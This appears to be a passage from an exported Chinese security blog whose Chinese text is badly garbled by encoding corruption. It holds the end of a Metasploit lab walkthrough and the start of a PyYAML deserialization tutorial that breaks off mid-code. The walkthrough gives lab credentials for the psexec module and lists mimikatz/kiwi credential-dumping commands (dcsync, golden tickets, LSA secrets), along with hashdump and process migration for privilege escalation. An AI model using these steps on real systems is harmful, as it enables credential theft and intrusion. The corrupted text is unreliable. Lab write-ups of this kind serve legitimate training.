‡ç³»ç»Ÿä¸Šå¯»æ‰¾æœ‰ä»·å€¼çš„æ–‡ä»¶ã€å¯»æ‰¾ç”¨æˆ·å‡­æ®ã€å¯»æ‰¾é¢å¤–çš„ç½‘ç»œæ¥å£å’Œä¸€èˆ¬ä¿¡æ¯ã€‚ æƒé™æå‡ã€‚ æ¨ªå‘ç§»åŠ¨ã€‚ ä½¿ç”¨ load å‘½ä»¤åŠ è½½å®Œä»»ä½•å…¶ä»–å·¥å…·åï¼Œä½ å°†åœ¨å¸®åŠ©èœå•ä¸Šçœ‹åˆ°ä¸€äº›æ–°é€‰é¡¹ã€‚ä¸‹é¢çš„ç¤ºä¾‹æ˜¾ç¤ºäº†æ·»åŠ Kiwiæ¨¡å—ä¹‹å äº§ç”Ÿçš„å‘½ä»¤ï¼ˆå…ˆä½¿ç”¨ load kiwi å‘½ä»¤ï¼‰ã€‚ meterpreter &gt; load kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x64/windows) .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' &gt; http://pingcastle.com / http://mysmartlogon.com ***/ Success. åœ¨å®Œæˆæ¨¡å—æ·»åŠ ä¹‹åï¼Œmeterpreterå‘½ä»¤åˆ—è¡¨ä¼šæ ¹æ®loadçš„èœå•å‘ç”Ÿä¸€äº›æ–°çš„å˜åŒ–ï¼Œè¯·ä½¿ç”¨ helpå‘½ä»¤é‡æ–°æŸ¥çœ‹å‘½ä»¤åˆ—è¡¨ï¼š Kiwi Commands ============= Command Description ------- ----------- creds_all Retrieve all credentials (parsed) creds_kerberos Retrieve Kerberos creds (parsed) creds_msv Retrieve LM/NTLM creds (parsed) creds_ssp Retrieve SSP creds creds_tspkg Retrieve TsPkg creds (parsed) creds_wdigest Retrieve WDigest creds (parsed) dcsync Retrieve user account information via DCSync (unparsed) dcsync_ntlm Retrieve user account NTLM hash, SID and RID via DCSync golden_ticket_create Create a golden kerberos ticket kerberos_ticket_list List all kerberos tickets (unparsed) kerberos_ticket_purge Purge any in-use kerberos tickets kerberos_ticket_use Use a kerberos ticket kiwi_cmd Execute an arbitary mimikatz command (unparsed) lsa_dump_sam Dump LSA SAM (unparsed) lsa_dump_secrets Dump LSA secrets (unparsed) password_change Change the password/hash of a user wifi_list List wifi profiles/creds for the current user wifi_list_shared List shared wifi profiles/creds (requires SYSTEM) å›ç­”ä¸‹é¢çš„é—®é¢˜å°†å¸®åŠ©ä½ æ›´å¥½åœ°äº†è§£ Meterpreter å¦‚ä½•åœ¨åæ¸—é€ä¸­ä½¿ç”¨ã€‚ ä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‡­æ®æ¥æ¨¡æ‹Ÿ é’ˆå¯¹SMBï¼ˆæœåŠ¡å™¨æ¶ˆæ¯å—ï¼‰çš„åˆå§‹æ”»å‡»ï¼ˆä½¿ç”¨ \" exploit/windows/smb/psexec \" æ¨¡å—ï¼‰ Username: ballen Password: Password1 é¦–å…ˆnmapå‘½ä»¤æ‰«æœåŠ¡ç«¯å£ï¼šnmap -T4 -sS -p- 10.10.195.224 ä¹‹åä¸Šmsfconsoleæ”»å‡»å¯¹åº”çš„SMBæœåŠ¡ ç„¶åç›´æ¥æ‹¿åˆ°sessionä¼šè¯ï¼Œsysinfoè·å–è®¡ç®—æœºåç§°ä»¥åŠç›®æ ‡åŸŸ ä¸è¿‡è¿™é‡Œéé¢„æœŸäº†ï¼Œè·Ÿç€æ–‡ç« æ€è·¯çœ‹çœ‹ï¼Œé¦–å…ˆbackgroundæŒ‚åå° use post/windows/gather/enum_domain//æŸ¥çœ‹åŸŸæ§ ç”¨æˆ·å¯èƒ½åˆ›å»ºçš„å…±äº«çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ use post/windows/gather/enum_shares ä½†æˆ‘è¿™é‡ŒæŠ¥é”™äº†ä¸çŸ¥é“ä¸ºä½•ï¼Œå…ˆä¸Šä¸€ä¸ªæ­£ç¡®ç»“æœå§ jchambers ç”¨æˆ·çš„ NTLM å“ˆå¸Œå€¼æ˜¯ä»€ä¹ˆï¼Ÿ sessions -i 1//é‡æ–°è¿›å…¥ä¼šè¯ //ç›´æ¥hashdumpè·å–ç”¨æˆ·hash è¿™é‡Œå¦‚æœç”¨æˆ·æƒé™ä¸è¶³ï¼Œä¹Ÿå¯psæŸ¥çœ‹è¿›ç¨‹ï¼Œå¦‚ä¸‹å›¾ï¼Œå¯ä»¥æ‰¾åˆ°å¯¹åº”çš„é«˜æƒé™è¿›ç¨‹ï¼Œä½¿ç”¨migrate pidè¿ç§»åˆ°å¯¹åº”è¿›ç¨‹å³å¯ææƒ jchambers ç”¨æˆ·çš„æ˜æ–‡å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ â€œsecrets.txtâ€æ–‡ä»¶ä½äºå“ªé‡Œï¼Ÿ ï¼ˆæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼‰ search -f secrets.txt #search -f *.txt æ–‡ä»¶è¾ƒå°‘æ—¶ç”¨*.txt c:\\Program Files (x86)\\Windows Multimedia Platform\\secrets.txt shell #ä½¿ç”¨shellå‘½ä»¤è¿›å…¥ç›®æ ‡ç³»ç»Ÿçš„shellç¯å¢ƒï¼Œæ–¹ä¾¿è¿›è¡Œcd--ç›®å½•åˆ‡æ¢æ“ä½œ cd c:\\Program Files (x86)\\Windows Multimedia Platform\\ type secrets.txt â€œsecrets.txtâ€æ–‡ä»¶ä¸­é€éœ²çš„ Twitter å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ â€œrealsecret.txtâ€æ–‡ä»¶ä½äºå“ªé‡Œï¼Ÿ ï¼ˆæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼‰ çœŸæ­£çš„ç§˜å¯†æ˜¯ä»€ä¹ˆï¼Ÿ","tags":["Metasploit"],"categories":["Metasploit"]},{"title":"PyYmalååºåˆ—åŒ–","path":"/2024/03/23/pyyaml-fan-xu-lie-hua/","content":"0x01 YMALç®€ä»‹ YAMLæ˜¯ä¸€ç§è½»é‡çº§çš„æ•°æ®åºåˆ—åŒ–è¯­è¨€ï¼Œå®ƒçš„åç§°æ˜¯\"YAML Ainâ€™t Markup Language\"çš„é€’å½’ç¼©å†™ã€‚å®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯æˆä¸ºä¸€ç§äººç±»å¯è¯»çš„æ•°æ®äº¤æ¢æ ¼å¼ã€‚ YAMLçš„è¯­æ³•éå¸¸ç®€æ´ï¼Œä½¿ç”¨ç¼©è¿›å’Œç‰¹å®šçš„ç¬¦å·æ¥è¡¨ç¤ºæ•°æ®ç»“æ„ã€‚å®ƒæ”¯æŒå¤šç§æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬æ ‡é‡ï¼ˆå­—ç¬¦ä¸²ã€æ•°å­—ã€å¸ƒå°”å€¼ç­‰ï¼‰ã€åºåˆ—ï¼ˆæ•°ç»„ã€åˆ—è¡¨ç­‰ï¼‰å’Œæ˜ å°„ï¼ˆé”®å€¼å¯¹ï¼‰ã€‚YAMLè¿˜æ”¯æŒæ³¨é‡Šå’Œå¼•ç”¨ï¼Œå¯ä»¥ä½¿æ–‡æ¡£æ›´æ˜“äºç†è§£å’Œç»´æŠ¤ã€‚ï¼ˆå…¶æ–‡ä»¶ä¸€èˆ¬ä»¥.ymlä¸ºåç¼€ï¼‰ 0x02 YamlåŸºæœ¬è¯­æ³• è¿™é‡Œä¹Ÿå°±æ˜¯çº¯cväº†ã€‚ å¤§å°å†™æ•æ„Ÿ aaa:1 AAA:2 è¿™ä¸¤ä¸ªå¯¹äºYamlæ¥è¯´æ˜¯ä¸åŒçš„å˜é‡ ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»ç¼©è¿›ä¸å…è®¸ä½¿ç”¨tabï¼Œåªå…è®¸ç©ºæ ¼ ç¼©è¿›çš„ç©ºæ ¼æ•°ä¸é‡è¦ï¼Œåªè¦ç›¸åŒå±‚çº§çš„å…ƒç´ å·¦å¯¹é½å³å¯ ä¸¾ä¸ªä¾‹å­ï¼Œ # This is a YAML document with nested structures person: name: John age: 30 address: street: Main St. city: Anytown state: CA hobbies: - reading - hiking - swimming åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œpersonæ˜¯ä¸€ä¸ªæ˜ å°„ç±»å‹ï¼ŒåŒ…å«å››ä¸ªé”®å€¼å¯¹ã€‚å…¶ä¸­addresså’Œhobbieséƒ½æ˜¯æ˜ å°„ç±»å‹å’Œåºåˆ—ç±»å‹çš„åµŒå¥—ç»“æ„ï¼Œä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»ã€‚addressåŒ…å«ä¸‰ä¸ªé”®å€¼å¯¹ï¼ŒhobbiesåŒ…å«ä¸€ä¸ªåºåˆ—ï¼Œå…¶ä¸­åŒ…å«ä¸‰ä¸ªå…ƒç´ ã€‚ '#'è¡¨ç¤ºæ³¨é‡Š ä½†æ˜¯åªèƒ½æ”¯æŒå•è¡Œæ³¨é‡Š #æ³¨é‡Š1 #æ³¨é‡Š2 ä¸€ä¸ªæ–‡ä»¶ä¸­å¯ä»¥åŒ…å«å¤šä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œç”¨â€œ â€” â€å³ä¸‰ä¸ªç ´æŠ˜å·è¡¨ç¤ºä¸€ä»½å†…å®¹çš„å¼€å§‹ï¼Œç”¨â€œ â€¦ â€å³ä¸‰ä¸ªå°æ•°ç‚¹è¡¨ç¤ºä¸€ä»½å†…å®¹çš„ç»“æŸï¼ˆéå¿…éœ€ï¼‰ --- example1: username: admin passwd: 123456 ... --- example2: username: aaa passwd: 666 ... 0x03 Yamlæ•°æ®ç±»å‹ä¸ç»“æ„ æ ‡é‡ï¼ˆScalarï¼‰ï¼šæ ‡é‡æ˜¯YAMLä¸­çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬å­—ç¬¦ä¸²ã€æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¸ƒå°”å€¼ç­‰ã€‚ä¾‹å¦‚ï¼š name: \"John\" # å­—ç¬¦ä¸² age: 30 # æ•´æ•° ï¼ˆå¯ä»¥æ”¯æŒäºŒè¿›åˆ¶è¡¨ç¤ºï¼‰ height: 5.8 # æµ®ç‚¹æ•° ï¼ˆå¯ä»¥æ”¯æŒç§‘å­¦è®¡æ•°æ³•ï¼‰ is_student: false # å¸ƒå°”å€¼ (null,Null,~å‡ä¸ºç©º) åˆ—è¡¨ï¼ˆListï¼‰ï¼šåˆ—è¡¨ç”¨çŸ­æ¨ªçº¿ï¼ˆ-ï¼‰è¡¨ç¤ºï¼Œå¯ä»¥åŒ…å«å¤šä¸ªæ ‡é‡å€¼ï¼Œå½¢æˆä¸€ä¸ªæœ‰åºçš„åºåˆ—ã€‚ä¾‹å¦‚ï¼š fruits: - apple - banana - orange æ”¯æŒå†…æ•›æ ¼å¼ï¼ˆç”¨æ–¹æ‹¬å·åŒ…è£¹ï¼Œç”¨é€—å·+ç©ºæ ¼åˆ†éš”ï¼‰ï¼Œä¾‹å¦‚ï¼š fruit: [apple, banana, orange] æ”¯æŒå¤šç»´æ•°ç»„ï¼ˆç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»ï¼‰ï¼Œä¾‹å¦‚ï¼š fruit: - - apple - banana - - orange æ˜ å°„ï¼ˆMappingï¼‰ï¼šæ˜ å°„ç”¨é”®å€¼å¯¹è¡¨ç¤ºï¼Œä½¿ç”¨å†’å·ï¼ˆ:ï¼‰åˆ†éš”é”®å’Œå€¼ï¼Œå¯ä»¥åŒ…å«å¤šä¸ªé”®å€¼å¯¹ï¼Œå½¢æˆä¸€ä¸ªæ— åºçš„é”®å€¼å¯¹é›†åˆã€‚ä¾‹å¦‚ï¼š person: name: John age: 30 city: New York æ”¯æŒæµå¼é£æ ¼çš„è¯­æ³•(ç”¨èŠ±æ‹¬å·åŒ…è£¹ï¼Œç”¨é€—å·+ç©ºæ ¼åˆ†å‰²)ï¼Œä¾‹å¦‚ï¼š key: { username: admin, passwd: 123456} å¯ä»¥ä½¿ç”¨â€œ?â€å£°æ˜ä¸€ä¸ªå¤æ‚å¯¹è±¡ï¼Œä»è€Œå¯ä»¥ä½¿ç”¨å¤šä¸ªæ•°ç»„æ¥ç»„æˆé”®ï¼Œä¾‹å¦‚ï¼š ? - user1 - user2 : - passwd1 - passwd2 å…è®¸å¤šå±‚åµŒå¥—(ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»)ï¼Œä¾‹å¦‚ï¼š example: aaa: 123 bbb: ccc: ddd: 666 åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œexampleæ˜¯ä¸€ä¸ªæ˜ å°„ç±»å‹ï¼ŒåŒ…å«ä¸€ä¸ªé”®å€¼å¯¹aaaå’Œä¸€ä¸ªé”®å€¼å¯¹bbbã€‚bbbçš„å€¼æ˜¯ä¸€ä¸ªæ˜ å°„ç±»å‹ï¼ŒåŒ…å«ä¸€ä¸ªé”®å€¼å¯¹cccï¼Œè€Œcccçš„å€¼åˆæ˜¯ä¸€ä¸ªæ˜ å°„ç±»å‹ï¼ŒåŒ…å«ä¸€ä¸ªé”®å€¼å¯¹dddã€‚dddçš„å€¼ä¸º666ã€‚ å¤šè¡Œå­—ç¬¦ä¸²ï¼ˆMulti-line Stringï¼‰ï¼šYAMLæ”¯æŒåœ¨æ ‡é‡å€¼ä¸­ä½¿ç”¨å¤šè¡Œå­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨ç®¡é“ç¬¦ï¼ˆ|ï¼‰æˆ–æŠ˜å å¼å¤§äºå·ï¼ˆ&gt;ï¼‰æ¥è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼š description: | This is a multi-line string using the pipe symbol. # æ¯è¡Œçš„ç¼©è¿›å’Œè¡Œå°¾ç©ºç™½éƒ½ä¼šè¢«å»æ‰ï¼Œè€Œé¢å¤–çš„ç¼©è¿›ä¼šè¢«ä¿ç•™ lines: &gt; aaa bbbbbb ccccccc dddddddd # åªæœ‰ç©ºç™½è¡Œæ‰ä¼šè¢«è¯†åˆ«ä¸ºæ¢è¡Œï¼ŒåŸæ¥çš„æ¢è¡Œç¬¦éƒ½ä¼šè¢«è½¬æ¢æˆç©ºæ ¼ å­—ç¬¦ä¸²ä¸€èˆ¬ä¸ç”¨å¼•å·åŒ…è£¹ï¼Œä½†æ˜¯å¦‚æœå­—ç¬¦ä¸²ä¸­ä½¿ç”¨äº†åæ–œæ â€œ\\â€å¼€å¤´çš„è½¬ä¹‰å­—ç¬¦å°±å¿…é¡»ç”¨å¼•å·åŒ…è£¹ï¼Œä¾‹å¦‚ strings: - Hi - \"\\u0048\\u0069\" # Hiçš„Unicodeç¼–ç  - \"\\x46\\x69\\x6e\\x65\" # Fineçš„Hexç¼–ç  å¼•ç”¨ï¼ˆReferenceï¼‰ï¼šYAMLæ”¯æŒä½¿ç”¨é”šç‚¹ï¼ˆ&amp;ï¼‰å’Œåˆ«åï¼ˆ*ï¼‰æ¥åˆ›å»ºå¼•ç”¨ï¼Œå¯ä»¥åœ¨ä¸åŒä½ç½®å¼•ç”¨ç›¸åŒçš„å€¼ã€‚ä¾‹å¦‚ï¼š person1: &amp;person_alias name: John age: 30 person2: *person_alias ç›¸å½“äº person1: name: John age: 30 person2: name: John age: 30 å¯ä»¥åˆ©ç”¨**é”šç‚¹ï¼ˆ&amp;ï¼‰å’Œåˆ«åï¼ˆ*ï¼‰ä»¥åŠåˆå¹¶æ ‡ç­¾\"&lt;&lt;\"**å°†æˆ‘ä»¬çš„yamlå˜å¾—æ›´åŠ æ•´æ´ï¼Œä¾‹å¦‚ï¼š # ä½¿ç”¨é”šç‚¹å’Œåˆ«åæ¶ˆé™¤é‡å¤ä»£ç  defaults: &amp;defaults host: localhost port: 8080 timeout: 30 development: &lt;&lt;: *defaults database: dev_db test: &lt;&lt;: *defaults database: test_db timeout: 60 production: &lt;&lt;: *defaults host: prod_host port: 80 ç›¸å½“äº development: host: localhost port: 8080 timeout: 30 database: dev_db test: host: localhost port: 8080 timeout: 60 database: test_db production: host: prod_host port: 80 timeout: 30 æ—¶é—´æˆ³ï¼ˆTimestampï¼‰ï¼šåœ¨YAMLä¸­ï¼Œå¯ä»¥ä½¿ç”¨ISO 8601æ ¼å¼çš„æ—¶é—´æˆ³æ¥è¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´ã€‚ISO 8601æ˜¯ä¸€ç§å›½é™…æ ‡å‡†ï¼Œç”¨äºè¡¨ç¤ºæ—¥æœŸã€æ—¶é—´å’Œæ—¥æœŸæ—¶é—´çš„æ ¼å¼ï¼Œä¾‹å¦‚ï¼š timestamp: 2023-04-24T12:34:56.789Z ç±»å‹è½¬æ¢ Yamlæ”¯æŒä½¿ç”¨**ä¸¥æ ¼ç±»å‹æ ‡ç­¾\"!!\"ï¼ˆåŒæ„Ÿå¹å·+ç›®æ ‡ç±»å‹ï¼‰**æ¥å¼ºåˆ¶è½¬æ¢ç±»å‹ï¼Œä¾‹å¦‚ï¼š # ä½¿ç”¨æ˜¾å¼ç±»å‹è½¬æ¢å°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°å’Œæµ®ç‚¹æ•° age: !!int 30 pi: !!float 3.14 # ä½¿ç”¨æ˜¾å¼ç±»å‹è½¬æ¢å°†æ•°å­—è½¬æ¢æˆå­—ç¬¦ä¸² number_as_str: !!str 123 # ä½¿ç”¨æ˜¾å¼ç±»å‹è½¬æ¢å°†å­—ç¬¦ä¸²è½¬æ¢æˆå¸ƒå°”å€¼ is_valid: !!bool \"true\" # ä½¿ç”¨æ˜¾å¼ç±»å‹è½¬æ¢å°†æ—¶é—´æˆ³è½¬æ¢æˆæ—¥æœŸæ—¶é—´ created_at: !!timestamp 2023-04-24T12:34:56.789Z # ä½¿ç”¨æ˜¾å¼ç±»å‹è½¬æ¢å°†åˆ—è¡¨è½¬æ¢æˆå…¶ä»–ç±»å‹ list_as_str: !!str [1, 2, 3] list_as_map: !!map [1, 2, 3] 0x04 ååºåˆ—åŒ–æ¼æ´æˆå›  PyYaml&lt;=5.1 åœ¨pythonä¸­çš„PyYAMLåº“ä¸­æä¾›è¿™å‡ ç§æ–¹å¼å®ç°pythonå’ŒYamlè¿™ä¸¤ç§è¯­è¨€çš„è½¬æ¢ã€‚ yaml-&gt;python yaml.dump yaml.dump(data) å°†Pythonå¯¹è±¡dataè½¬æ¢ä¸ºYAMLæ ¼å¼çš„æ–¹æ³•ã€‚å®ƒå°†Pythonå¯¹è±¡åºåˆ—åŒ–ä¸ºYAMLæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›è¿™ä¸ªå­—ç¬¦ä¸²ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œdataæ˜¯ä¸€ä¸ªPythonå¯¹è±¡ï¼Œå¯ä»¥æ˜¯å­—å…¸ã€åˆ—è¡¨ã€å…ƒç»„ã€æ•´æ•°ã€æµ®ç‚¹æ•°ã€å­—ç¬¦ä¸²ã€å¸ƒå°”å€¼ç­‰åŸºæœ¬æ•°æ®ç±»å‹ï¼Œä¹Ÿå¯ä»¥æ˜¯è‡ªå®šä¹‰çš„ç±»çš„å®ä¾‹ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š import yaml data = { 'name': 'John', 'age': 30, 'is_student': True, 'hobbies': ['reading', 'swimming', 'traveling'], 'address': { 'street': '123 Main St', 'city': 'Anytown', 'state': 'CA', 'zip': '12345' } } yaml_data = yaml.dump(data) print(yaml_data) è¾“å‡ºç»“æœï¼š address: city: Anytown state: CA street: 123 Main St zip: '12345' age: 30 hobbies: - reading - swimming - traveling is_student: true name: John åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªdataå­—å…¸ï¼Œç„¶åä½¿ç”¨yaml.dumpæ–¹æ³•å°†dataå¯¹è±¡åºåˆ—ä¸ºyamlæ ¼å¼ï¼Œå¹¶èµ‹å€¼ç»™yaml_dataï¼Œæœ€åæ‰“å°å‡ºæ¥ï¼Œå¾—åˆ°æˆ‘ä»¬æœ€ç»ˆçš„yamlæ ¼å¼æ•°æ® å…¶å®é€šä¿—ç‚¹æ¥è¯´ï¼Œå°±æ˜¯å°†pythonçš„å¯¹è±¡å®ä¾‹è½¬åŒ–ä¸ºyamlæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯åºåˆ—åŒ–ã€‚ å¦‚æœæˆ‘ä»¬çš„Pythonå¯¹è±¡ä¸­åŒ…å«è‡ªå®šä¹‰ç±»çš„å®ä¾‹ã€å‡½æ•°ç­‰ï¼Œé‚£ä¹ˆä½¿ç”¨yaml.dumpæ–¹æ³•è¿›è¡Œåºåˆ—åŒ–å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨YAMLæ•°æ®ä¸­æ³¨å…¥æ¶æ„ä»£ç æ¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œå¯¼è‡´åº”ç”¨ç¨‹åºå—åˆ°æ”»å‡»ã€‚ python-&gt;yaml load() load(data) load(data)æ˜¯å°†YAMLæ ¼å¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºPythonå¯¹è±¡çš„æ–¹æ³•ã€‚å®ƒå°†YAMLæ ¼å¼çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºPythonå¯¹è±¡ï¼Œå¹¶è¿”å›è¿™ä¸ªå¯¹è±¡ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œdataæ˜¯ä¸€ä¸ªåŒ…å«YAMLæ ¼å¼å­—ç¬¦ä¸²çš„å˜é‡ï¼Œå¯ä»¥æ˜¯ä»æ–‡ä»¶ä¸­è¯»å–çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ç­‰ã€‚ import yaml data = \"\"\" address: city: Anytown state: CA street: 123 Main St zip: '12345' age: 30 hobbies: - reading - swimming - traveling is_student: true name: John \"\"\" yaml_data = yaml.load(data, Loader=yaml.Loader) print(yaml_data) è¿™é‡Œçœ‹æ–‡ç« ä»–åªä½¿ç”¨load(data)å°±èƒ½è¡Œï¼Œä½†æˆ‘è¿™é‡Œå¿…é¡»æ·»åŠ Loaderè§£æå™¨å‚æ•° {'address': {'city': 'Anytown', 'state': 'CA', 'street': '123 Main St', 'zip': '12345'}, 'age': 30, 'hobbies': ['reading', 'swimming', 'traveling'], 'is_student': True, 'name': 'John'} è¿™æ®µä»£ç æ˜¯å°†ä¸€ä¸ªåŒ…å«YAMLæ ¼å¼å­—ç¬¦ä¸²çš„å˜é‡yaml_dataååºåˆ—åŒ–ä¸ºPythonå¯¹è±¡ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å˜é‡dataã€‚ç„¶åï¼Œå®ƒæ‰“å°å‡ºdataï¼Œè¾“å‡ºååºåˆ—åŒ–åçš„Pythonå¯¹è±¡ã€‚ load(data, Loader=yaml.Loader) load(data, Loader=yaml.Loader)æ˜¯å°†YAMLæ ¼å¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºPythonå¯¹è±¡çš„æ–¹æ³•ï¼Œå…¶ä¸­Loaderå‚æ•°æŒ‡å®šäº†YAMLè§£æå™¨çš„ç±»å‹ã€‚ åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œyaml.loadæ–¹æ³•ä½¿ç”¨çš„è§£æå™¨æ˜¯yaml.SafeLoaderï¼Œå®ƒå¯ä»¥å®‰å…¨åœ°è§£æå¤§å¤šæ•°YAMLæ ¼å¼æ•°æ®ï¼Œä½†æ˜¯ä¸èƒ½è§£æåŒ…å«Pythonå¯¹è±¡çš„YAMLæ•°æ®ã€‚ &lt;=5.1 ç‰ˆæœ¬ä¸­æä¾›äº†å‡ ä¸ªæ–¹æ³•ç”¨äºè§£æ YAMLï¼š yaml.loadï¼šåŠ è½½å•ä¸ª YAML é…ç½® yaml.load_allï¼šåŠ è½½å¤šä¸ª YAML é…ç½® è¿™é‡Œè¯´æ˜ä¸€ä¸‹PyYaml&lt;=5.1ç‰ˆæœ¬çš„Loaderéƒ½æœ‰å“ªäº›åŠ è½½å™¨ Constructor:5.1ç‰ˆæœ¬ä¸€ä¸‹é»˜è®¤æ­¤åŠ è½½å™¨ï¼Œåœ¨ YAML è§„èŒƒä¸Šæ–°å¢äº†å¾ˆå¤šå¼ºåˆ¶ç±»å‹è½¬æ¢ BaseConstructorï¼šä¸æ”¯æŒå¼ºåˆ¶ç±»å‹è½¬æ¢ SafeConstructorï¼šæ”¯æŒå¼ºåˆ¶ç±»å‹è½¬æ¢å’Œ YAML è§„èŒƒä¿æŒä¸€è‡´ è¿™é‡Œä»¥é»˜è®¤çš„ConstructoråŠ è½½å™¨ä¸ºä¾‹ï¼Œç¤ºä¾‹ä»£ç ï¼š import yaml class Person: def __init__(self, name, age): self.name = name self.age = age # è‡ªå®šä¹‰æ„é€ å™¨å‡½æ•° def construct_person(loader, node): # è·å–Personç±»çš„å±æ€§å€¼ data = loader.construct_mapping(node, deep=True) # å®ä¾‹åŒ–Personç±»å¹¶è®¾ç½®å±æ€§ return Person(data['name'], data['age']) # å°†!python/objectæ ‡ç­¾æ˜ å°„åˆ°è‡ªå®šä¹‰æ„é€ å™¨å‡½æ•° yaml.add_constructor('!python/object:__main__.Person', construct_person) # å®šä¹‰ä¸€ä¸ªåŒ…å«è‡ªå®šä¹‰ç±»å®ä¾‹çš„YAMLæ•°æ® yaml_data = \"\"\" name: John age: 30 person: !python/object:__main__.Person name: Alice age: 25 \"\"\" # ä½¿ç”¨yaml.Loader()æ–¹æ³•è§£æYAMLæ•°æ® data = yaml.load(yaml_data, Loader=yaml.Loader) # è¾“å‡ºè§£æåçš„Pythonå¯¹è±¡ print(data) è¾“å‡ºç»“æœï¼š {'name': 'John', 'age': 30, 'person': &lt;__main__.Person object at 0x000001BA17055390&gt;} è¿™é‡Œå¯¹äºä»£ç æœ‰è®¸å¤šä¸æ‡‚å¾—åœ°æ–¹ï¼Œç»“åˆGPTç†è§£ä¸€ç•ª é¦–å…ˆçœ‹è¿™è¡Œä»£ç yaml.add_constructor('!python/object:__main__.Person', construct_person) è¿™é‡Œå°±æ˜¯å°†!python/object:__main__.Personæ ‡ç­¾æ˜ å°„åˆ°construct_personå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬åœ¨è§£æyamlæ•°æ®çš„æ—¶å€™ï¼Œå¦‚æœé‡åˆ°äº†!python/object:__main__.Personæ ‡ç­¾ï¼Œé‚£å°±ä¼šè‡ªåŠ¨çš„å»è°ƒç”¨construct_personå‡½æ•°ã€‚ è€Œconstruct_personå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå…¶ä¸­çš„nodeå‚æ•°å®é™…ä»£è¡¨ç€èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯!python/object:__main__.Personæ ‡ç­¾æ‰€å¯¹åº”çš„èŠ‚ç‚¹personï¼Œåœ¨è°ƒç”¨construct_personå‡½æ•°çš„æ—¶å€™ï¼Œä¼šå°†personèŠ‚ç‚¹èµ‹å€¼ç»™nodeï¼Œæ¥ç€é€šè¿‡loader.construct_mappingå‡½æ•°ï¼Œè·å–personèŠ‚ç‚¹ä¸­çš„å±æ€§å€¼ï¼Œè½¬æ¢ä¸ºå­—å…¸çš„å½¢å¼ï¼Œèµ‹å€¼ç»™dataå‚æ•°ï¼Œæœ€åreturnçš„æ—¶å€™ï¼Œå®ä¾‹åŒ–Personç±»ï¼Œå°†å¯¹åº”çš„é”®å€¼ä¼ å…¥ load_all(data)â€”â€”è¯¥å‡½æ•°ä¸Šé¢ä¹Ÿæåˆ°è¿‡ï¼Œè¿™é‡Œä¸¾ä¸ªä¾‹å­æ¥ç†è§£ load_all(data)æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨è¡¨è¾¾å¼ï¼Œå…¶ä¸­dataæ˜¯ä¸€ä¸ªåŒ…å«å¤šä¸ªYAMLæ–‡æ¡£çš„å­—ç¬¦ä¸²ã€‚load_allå‡½æ•°æ˜¯PyYAMLæ¨¡å—ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºä»ä¸€ä¸ªåŒ…å«å¤šä¸ªYAMLæ–‡æ¡£çš„å­—ç¬¦ä¸²ä¸­è§£æå‡ºæ‰€æœ‰çš„YAMLæ–‡æ¡£ï¼Œå¹¶è¿”å›ä¸€ä¸ªç”Ÿæˆå™¨å¯¹è±¡ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªPythonå¯¹è±¡ï¼Œå¯¹åº”ä¸€ä¸ªYAMLæ–‡æ¡£ã€‚ import yaml # å®šä¹‰åŒ…å«ä¸¤ä¸ªYAMLæ–‡æ¡£çš„å­—ç¬¦ä¸² yaml_data = \"\"\" - name: John age: 30 - name: Alice age: 25 \"\"\" # ä½¿ç”¨yaml.load_all()æ–¹æ³•è§£ææ‰€æœ‰çš„YAMLæ–‡æ¡£ docs = yaml.load_all(yaml_data, 